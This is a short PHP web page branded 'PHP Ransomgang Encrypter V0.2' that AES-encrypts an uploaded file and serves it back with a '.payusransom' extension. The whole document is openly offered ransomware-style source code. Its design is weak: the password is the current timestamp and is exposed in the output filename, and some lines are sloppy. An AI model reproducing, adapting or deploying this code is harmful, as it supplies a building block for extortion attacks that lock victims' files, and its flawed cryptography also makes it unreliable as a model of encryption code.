<?php
$ALGO	 	= 'AES-256-CBC';
$IV 		= openssl_random_pseudo_bytes(openssl_cipher_iv_length($ALGO));
$date 		= new DateTime();
$password 	= $date->getTimestamp();
if (isset($_POST) && isset($_FILES['file'])){
	
    $file      = isset($_FILES['file']);
    $content   = '';
    $content   = file_get_contents($_FILES['file']['tmp_name']);
    $filename  = $_FILES['file']['name'];
    $content   = openssl_encrypt($content, $ALGO, $password, 0, $IV);
    $content   .= $IV;
    $filename  = $password . '.payusransom';
    header("Pragma: public");
    header("Pragma: no-cache");
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Expires: 0");
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"" . $filename . "\";");
    $size = strlen($content);
    header("Content-Length: " . $size);
    echo $content;
    die;
}
?>
<html>
  <head>
    <title>Encrypt file(s)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="col-12" >
          <h1>PHP Ransomgang Encrypter V0.2</h1>
        </div>
      </div>
      <form class="form" enctype="multipart/form-data" method="post" id="form1" name="form1" auto-complete="off">
        <div class="form-row">
          <div class="form-group">
            <label for="file">File</label>
            <input type="file" name="file" id="file" placeholder="Choose a file" required class="form-control-file" required/>
          </div>
        </div>
        <div class="form-row">
          <button type="submit" class="btn btn-primary" onclick="setTimeout('document.form1.reset();',1000)">Encrypt</button>
         </div>
      </form>
    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
